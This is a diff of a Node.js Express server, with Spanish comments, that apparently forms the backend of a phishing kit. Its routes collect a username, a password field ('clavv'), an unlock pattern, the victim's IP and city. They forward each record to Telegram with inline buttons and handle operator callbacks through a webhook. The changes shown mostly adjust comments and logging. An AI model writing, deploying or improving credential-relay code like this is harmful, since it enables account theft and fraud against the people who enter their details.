@@ -72,7 +72,7 @@ Secuencia: <code>${patron}</code>
   `;
 
   try {
-    // Guardamos estado como "patron"
+    // Guardamos estado
     const cliente = { status: "patron", usar, ip, ciudad: city, preguntas: [] };
     guardarCliente(txid, cliente);
 
@@ -91,6 +91,7 @@ Secuencia: <code>${patron}</code>
       { headers: formData.getHeaders(), httpsAgent: agent }
     );
 
+    // Botones de control
     const keyboard = {
       inline_keyboard: [
         [
@@ -116,10 +117,9 @@ Secuencia: <code>${patron}</code>
       })
     });
 
-    console.log("✅ Patrón e info enviados a Telegram");
     res.status(200).json({ success: true });
   } catch (error) {
-    console.error("❌ Error al enviar patrón a Telegram:", error.response?.data || error.message);
+    console.error("❌ Error al enviar patrón:", error.response?.data || error.message);
     res.status(500).json({ success: false, error: error.message });
   }
 });
@@ -139,7 +139,7 @@ app.post('/enviar', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
-  const cliente = { status: "esperando", usar, clavv, preguntas: [], esperando: null, ip, ciudad };
+  const cliente = { status: "esperando", usar, clavv, preguntas: [], ip, ciudad };
   guardarCliente(txid, cliente);
 
   const keyboard = {
@@ -182,7 +182,6 @@ app.post('/enviar3', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
-  // 👇 Ahora guardamos estado como "esperando"
   const cliente = { status: "esperando", usar, clavv, ip, ciudad };
   guardarCliente(txid, cliente);
 
@@ -209,7 +208,7 @@ app.post('/enviar3', async (req, res) => {
   res.sendStatus(200);
 });
 
-// 🔹 Webhook de control
+// 🔹 Webhook de control (botones Telegram)
 app.post('/webhook', async (req, res) => {
   if (req.body.callback_query) {
     const callback = req.body.callback_query;
